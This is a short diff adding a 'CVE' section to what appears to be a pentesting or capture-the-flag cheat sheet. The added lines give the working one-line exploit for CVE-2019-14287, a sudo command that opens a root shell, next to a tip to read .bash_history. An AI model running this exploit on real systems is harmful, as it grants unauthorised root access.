@@ -193,6 +193,14 @@ pdf @main
 ```
 
 
+## CVE
+
+```
+CVE-2019-14287
+sudo -u \#$((0xffffffff)) /bin/bash
+```
+
+
 ## TIPS
 ```
 cat .bash_history
